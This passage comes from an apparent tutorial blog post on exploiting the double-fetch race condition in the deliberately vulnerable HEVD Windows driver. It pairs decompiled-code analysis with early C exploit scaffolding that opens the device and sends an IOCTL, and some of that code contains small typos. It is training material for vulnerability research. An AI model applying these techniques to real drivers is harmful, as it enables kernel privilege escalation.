<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Example UserModeBuffer Structure</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
<span class="normal"><a href="#__codelineno-1-2">2</a></span>
<span class="normal"><a href="#__codelineno-1-3">3</a></span>
<span class="normal"><a href="#__codelineno-1-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="n">UserModeBuffer</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="w">    </span><span class="kt">char</span><span class="w">    </span><span class="n">Buffer</span><span class="w"></span>
<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="w">    </span><span class="kt">size_t</span><span class="w">  </span><span class="n">BufferSize</span><span class="w"></span>
<a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>If we keep moving down the function we can see that a local variable is assigned to the value of <code>Address+1</code> which we know is the size member of our structure based on the print statements before. That local variable is then checked against the size of the stack allocated buffer 2048 bytes.</p>
<p>If the value of <code>Address+1</code> is less-than or equal to 2048 bytes then we will execute an <code>RtlCopyMemory</code> of our user-mode structure into the stack allocated buffer <code>Dst</code> with the size specified in <code>Address+1</code>. If however anything other than that size check is passed, we will fall into the else condition and receive an <code>Invalid Buffer Size</code> error and return an error code.</p>
<p>At this point it should be pretty clear where the vulnerability is here. Let's re-examine the case of us passing the size check in more detail to fully understand the bug. <em>I've cleaned up the decompilation slightly for ease of reading</em>.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Size Check in Detail</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
<span class="normal"><a href="#__codelineno-2-2">2</a></span>
<span class="normal"><a href="#__codelineno-2-3">3</a></span>
<span class="normal"><a href="#__codelineno-2-4">4</a></span>
<span class="normal"><a href="#__codelineno-2-5">5</a></span>
<span class="normal"><a href="#__codelineno-2-6">6</a></span>
<span class="normal"><a href="#__codelineno-2-7">7</a></span>
<span class="normal"><a href="#__codelineno-2-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="n">check_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">);</span><span class="w"> </span><span class="c1">// (1)</span>
<a id="__codelineno-2-2" name="__codelineno-2-2"></a>
<a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">check_size</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">2048</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">    </span><span class="n">DbgPrintEx</span><span class="p">(</span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;[+] Triggering Double Fetch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">    </span><span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">Dst</span><span class="p">,</span><span class="w"> </span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="n">UserBuffer</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">);</span><span class="w"> </span><span class="c1">// (2)</span>
<a id="__codelineno-2-6" name="__codelineno-2-6"></a>
<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<ol>
<li><code>UserBuffer-&gt;Size</code> is fetched once here before the size check</li>
<li><code>UserBuffer-&gt;Size</code> is then fetched again to use as the size in the copy, even though a local variable <code>check_size</code> has the size after the first fetch</li>
</ol>
<p>So we know that our input is in the form of a structure where the first member is our buffer and the second member is a size, we also know that before we can perform a copy from the user-mode buffer into the stack allocated buffer a size check is performed. If that size check is <strong>less-than or equal to 2048</strong> (the size of <code>Dst</code>) then we'll perform the copy. </p>
<p>However, there is a problem here in the copy. Notice how the <code>UserBuffer-&gt;Size</code> member is actually <strong>fetched</strong> twice. It is first fetched for the size check and then it is <strong>fetched</strong> again for the copy, here lies the vulnerability. Instead of using the <code>check_size</code> value in the copy, the code fetches our structure member again, this is wrong. The question becomes what if we can somehow pass this size check but then after we pass it give a bigger size than the size value that was used in order to pass the check?</p>
<hr>

<h1 id="dynamic-analysis">Dynamic Analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">&para;</a></h1>
<p>Now that we've performed static analysis of the suspected vulnerability it is time to start building a program to interact with the code and prove that our suspected vulnerability is in-fact exploitable.</p>
<h2 id="interacting-with-the-driver">Interacting with the Driver<a class="headerlink" href="#interacting-with-the-driver" title="Permanent link">&para;</a></h2>
<p>Similarly to the last post we're going to choose to use C in order to interact with the driver, I explained my reasoning for using C in the last post, I won't cover them again here. We also need to keep in mind that in order to exploit this vulnerability we're going to need two threads, if we do this in a single thread, we won't be able to exploit the vulnerability, and we'll show why shortly.</p>
<p>To get us started we'll need to open a handle to the device, the below code block will do that. It is almost identical to the method we used in the previous post only this time it has its own function. If you're following along for yourself I would actually recommend that you create a separate source file with some utility functions in, and put this there since you're going to need to open a handle for everything anyways. I am simply including it for clarity.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Simple Driver Interaction</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-3-10">10</a></span>
<span class="normal"><a href="#__codelineno-3-11">11</a></span>
<span class="normal"><a href="#__codelineno-3-12">12</a></span>
<span class="normal"><a href="#__codelineno-3-13">13</a></span>
<span class="normal"><a href="#__codelineno-3-14">14</a></span>
<span class="normal"><a href="#__codelineno-3-15">15</a></span>
<span class="normal"><a href="#__codelineno-3-16">16</a></span>
<span class="normal"><a href="#__codelineno-3-17">17</a></span>
<span class="normal"><a href="#__codelineno-3-18">18</a></span>
<span class="normal"><a href="#__codelineno-3-19">19</a></span>
<span class="normal"><a href="#__codelineno-3-20">20</a></span>
<span class="normal"><a href="#__codelineno-3-21">21</a></span>
<span class="normal"><a href="#__codelineno-3-22">22</a></span>
<span class="normal"><a href="#__codelineno-3-23">23</a></span>
<span class="normal"><a href="#__codelineno-3-24">24</a></span>
<span class="normal"><a href="#__codelineno-3-25">25</a></span>
<span class="normal"><a href="#__codelineno-3-26">26</a></span>
<span class="normal"><a href="#__codelineno-3-27">27</a></span>
<span class="normal"><a href="#__codelineno-3-28">28</a></span>
<span class="normal"><a href="#__codelineno-3-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<a id="__codelineno-3-3" name="__codelineno-3-3"></a>
<a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
<a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="cp">#define IOCTL_CODE 0x222037</span>
<a id="__codelineno-3-6" name="__codelineno-3-6"></a>
<a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="n">HANDLE</span><span class="w"> </span><span class="nf">OpenDriverHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to open driver handle!&quot;</span><span class="err">\</span><span class="n">n</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-14" name="__codelineno-3-14"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-15" name="__codelineno-3-15"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="w">    </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-3-17" name="__codelineno-3-17"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-18" name="__codelineno-3-18"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opened Driver Handle: 0x%x&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-19" name="__codelineno-3-19"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-3-20" name="__codelineno-3-20"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-3-21" name="__codelineno-3-21"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-3-22" name="__codelineno-3-22"></a>
<a id="__codelineno-3-23" name="__codelineno-3-23"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-3-24" name="__codelineno-3-24"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-3-25" name="__codelineno-3-25"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: Double Fetch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-3-26" name="__codelineno-3-26"></a>
<a id="__codelineno-3-27" name="__codelineno-3-27"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to driver!</span><span class="se">\n</span><span class="s">);</span>
<a id="__codelineno-3-28" name="__codelineno-3-28"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenDeviceHandle</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-3-29" name="__codelineno-3-29"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Now that we've got a handle to the device we'll also need to issue a <code>DeviceIoControl</code> request in order to interact with the <abbr title="Input Output Control">IOCTL</abbr> for our Double Fetch function. The below code block is the additional code added in order to make that request. <em>Bear in mind currently this is all single-threaded.</em></p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Beginnings of an exploit function</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-4-10">10</a></span>
<span class="normal"><a href="#__codelineno-4-11">11</a></span>
<span class="normal"><a href="#__codelineno-4-12">12</a></span>
<span class="normal"><a href="#__codelineno-4-13">13</a></span>
<span class="normal"><a href="#__codelineno-4-14">14</a></span>
<span class="normal"><a href="#__codelineno-4-15">15</a></span>
<span class="normal"><a href="#__codelineno-4-16">16</a></span>
<span class="normal"><a href="#__codelineno-4-17">17</a></span>
<span class="normal"><a href="#__codelineno-4-18">18</a></span>
<span class="normal"><a href="#__codelineno-4-19">19</a></span>
<span class="normal"><a href="#__codelineno-4-20">20</a></span>
<span class="normal"><a href="#__codelineno-4-21">21</a></span>
<span class="normal"><a href="#__codelineno-4-22">22</a></span>
<span class="normal"><a href="#__codelineno-4-23">23</a></span>
<span class="normal"><a href="#__codelineno-4-24">24</a></span>
<span class="normal"><a href="#__codelineno-4-25">25</a></span>
<span class="normal"><a href="#__codelineno-4-26">26</a></span>
<span class="normal"><a href="#__codelineno-4-27">27</a></span>
<span class="normal"><a href="#__codelineno-4-28">28</a></span>
<span class="normal"><a href="#__codelineno-4-29">29</a></span>
<span class="normal"><a href="#__codelineno-4-30">30</a></span>
<span class="normal"><a href="#__codelineno-4-31">31</a></span>
<span class="normal"><a href="#__codelineno-4-32">32</a></span>
<span class="normal"><a href="#__codelineno-4-33">33</a></span>
<span class="normal"><a href="#__codelineno-4-34">34</a></span>
<span class="normal"><a href="#__codelineno-4-35">35</a></span>
<span class="normal"><a href="#__codelineno-4-36">36</a></span>
<span class="normal"><a href="#__codelineno-4-37">37</a></span>
<span class="normal"><a href="#__codelineno-4-38">38</a></span>
<span class="normal"><a href="#__codelineno-4-39">39</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_USER_DOUBLE_FETCH</span><span class="w"></span>
<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">Buffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">Size</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="p">}</span><span class="w"> </span><span class="n">USER_DOUBLE_FETCH</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PUSER_DOUBLE_FETCH</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-6" name="__codelineno-4-6"></a>
<a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-9" name="__codelineno-4-9"></a>
<a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">UserBufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2048</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-12" name="__codelineno-4-12"></a>
<a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH struct */</span><span class="w"></span>
<a id="__codelineno-4-14" name="__codelineno-4-14"></a><span class="w">    </span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PAGE_NOCACHE</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">PtrUserDoubleFetch</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-4-16" name="__codelineno-4-16"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-17" name="__codelineno-4-17"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-18" name="__codelineno-4-18"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-19" name="__codelineno-4-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-20" name="__codelineno-4-20"></a>
<a id="__codelineno-4-21" name="__codelineno-4-21"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH members */</span><span class="w"></span>
<a id="__codelineno-4-22" name="__codelineno-4-22"></a><span class="w">    </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-23" name="__codelineno-4-23"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">UserBuffer</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-4-24" name="__codelineno-4-24"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-25" name="__codelineno-4-25"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate heap buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-26" name="__codelineno-4-26"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-27" name="__codelineno-4-27"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-28" name="__codelineno-4-28"></a>
<a id="__codelineno-4-29" name="__codelineno-4-29"></a><span class="w">    </span><span class="cm">/* Initialize USER_DOUBLE_FETCH struct members */</span><span class="w"></span>
<a id="__codelineno-4-30" name="__codelineno-4-30"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-31" name="__codelineno-4-31"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-32" name="__codelineno-4-32"></a>
<a id="__codelineno-4-33" name="__codelineno-4-33"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="p">,</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-4-34" name="__codelineno-4-34"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-4-35" name="__codelineno-4-35"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-4-36" name="__codelineno-4-36"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-4-37" name="__codelineno-4-37"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-4-38" name="__codelineno-4-38"></a>
<a id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>In the above code block we first define a structure called <code>_USER_DOUBLE_FETCH</code> note the use of a typedef here, if you're unsure about the purpose of that then I'd recommend reading <a href="https://stackoverflow.com/questions/252780/why-should-we-typedef-a-struct-so-often-in-c">this answer</a> and <a href="https://stackoverflow.com/questions/44020831/why-to-use-an-underscore-for-a-struct-in-c">this answer</a> on StackOverflow, in short, it makes our life easier. Inside our structure we've defined two members, the same members which are defined in the driver based on the <code>DbgPrint</code> statements we saw. The <a href="https://stackoverflow.com/questions/494163/what-is-pvoid-data-type">first is a pointer</a> to a buffer and the second is a size value.</p>
<p>In the next part of the code at the top of the <code>exploit()</code> function we allocate our created structure on the stack using a call to <code>VirtualAlloc</code>, then we check that the allocation was successful. One particularly important part of our call to <code>VirtualAlloc</code> is the use of <code>PAGE_NOCACHE</code> as the name suggests this sets the allocated pages to be non-cacheable, this is particularly important in regards to winning race conditions because a cached page could interfere with us winning the race. You can find more detail on that particularity in this <a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/42189.pdf">fantastic paper</a> published by Gynvael Coldwind from Google.</p>
<p>Directly after we then perform a <code>HeapAlloc</code> for the <code>UserBuffer</code> and we use the <code>UserBufferSize</code> defined at the top of the <code>exploit()</code> function. Remember at this point we are not trying to exploit the vulnerability we are simply trying to verify we can successfully interact with it. Following the heap allocation we initialize the structure members with our defined <code>UserBuffer</code> and <code>UserBufferSize</code> values respectively.</p>
<p>Finally we issue our <code>DeviceIoControl</code> request in order to interact with the vulnerable <abbr title="Input Output Control">IOCTL</abbr>. As you can see already, there is a significant amount of more work required here compared to the buffer overflow in the previous post. In the below code block you can see the finished result of everything we've just covered.</p>
<h3 id="exploit-summary-0x1">Exploit Summary 0x1<a class="headerlink" href="#exploit-summary-0x1" title="Permanent link">&para;</a></h3>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Exploit so Far</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-5-10">10</a></span>
<span class="normal"><a href="#__codelineno-5-11">11</a></span>
<span class="normal"><a href="#__codelineno-5-12">12</a></span>
<span class="normal"><a href="#__codelineno-5-13">13</a></span>
<span class="normal"><a href="#__codelineno-5-14">14</a></span>
<span class="normal"><a href="#__codelineno-5-15">15</a></span>
<span class="normal"><a href="#__codelineno-5-16">16</a></span>
<span class="normal"><a href="#__codelineno-5-17">17</a></span>
<span class="normal"><a href="#__codelineno-5-18">18</a></span>
<span class="normal"><a href="#__codelineno-5-19">19</a></span>
<span class="normal"><a href="#__codelineno-5-20">20</a></span>
<span class="normal"><a href="#__codelineno-5-21">21</a></span>
<span class="normal"><a href="#__codelineno-5-22">22</a></span>
<span class="normal"><a href="#__codelineno-5-23">23</a></span>
<span class="normal"><a href="#__codelineno-5-24">24</a></span>
<span class="normal"><a href="#__codelineno-5-25">25</a></span>
<span class="normal"><a href="#__codelineno-5-26">26</a></span>
<span class="normal"><a href="#__codelineno-5-27">27</a></span>
<span class="normal"><a href="#__codelineno-5-28">28</a></span>
<span class="normal"><a href="#__codelineno-5-29">29</a></span>
<span class="normal"><a href="#__codelineno-5-30">30</a></span>
<span class="normal"><a href="#__codelineno-5-31">31</a></span>
<span class="normal"><a href="#__codelineno-5-32">32</a></span>
<span class="normal"><a href="#__codelineno-5-33">33</a></span>
<span class="normal"><a href="#__codelineno-5-34">34</a></span>
<span class="normal"><a href="#__codelineno-5-35">35</a></span>
<span class="normal"><a href="#__codelineno-5-36">36</a></span>
<span class="normal"><a href="#__codelineno-5-37">37</a></span>
<span class="normal"><a href="#__codelineno-5-38">38</a></span>
<span class="normal"><a href="#__codelineno-5-39">39</a></span>
<span class="normal"><a href="#__codelineno-5-40">40</a></span>
<span class="normal"><a href="#__codelineno-5-41">41</a></span>
<span class="normal"><a href="#__codelineno-5-42">42</a></span>
<span class="normal"><a href="#__codelineno-5-43">43</a></span>
<span class="normal"><a href="#__codelineno-5-44">44</a></span>
<span class="normal"><a href="#__codelineno-5-45">45</a></span>
<span class="normal"><a href="#__codelineno-5-46">46</a></span>
<span class="normal"><a href="#__codelineno-5-47">47</a></span>
<span class="normal"><a href="#__codelineno-5-48">48</a></span>
<span class="normal"><a href="#__codelineno-5-49">49</a></span>
<span class="normal"><a href="#__codelineno-5-50">50</a></span>
<span class="normal"><a href="#__codelineno-5-51">51</a></span>
<span class="normal"><a href="#__codelineno-5-52">52</a></span>
<span class="normal"><a href="#__codelineno-5-53">53</a></span>
<span class="normal"><a href="#__codelineno-5-54">54</a></span>
<span class="normal"><a href="#__codelineno-5-55">55</a></span>
<span class="normal"><a href="#__codelineno-5-56">56</a></span>
<span class="normal"><a href="#__codelineno-5-57">57</a></span>
<span class="normal"><a href="#__codelineno-5-58">58</a></span>
<span class="normal"><a href="#__codelineno-5-59">59</a></span>
<span class="normal"><a href="#__codelineno-5-60">60</a></span>
<span class="normal"><a href="#__codelineno-5-61">61</a></span>
<span class="normal"><a href="#__codelineno-5-62">62</a></span>
<span class="normal"><a href="#__codelineno-5-63">63</a></span>
<span class="normal"><a href="#__codelineno-5-64">64</a></span>
<span class="normal"><a href="#__codelineno-5-65">65</a></span>
<span class="normal"><a href="#__codelineno-5-66">66</a></span>
<span class="normal"><a href="#__codelineno-5-67">67</a></span>
<span class="normal"><a href="#__codelineno-5-68">68</a></span>
<span class="normal"><a href="#__codelineno-5-69">69</a></span>
<span class="normal"><a href="#__codelineno-5-70">70</a></span>
<span class="normal"><a href="#__codelineno-5-71">71</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
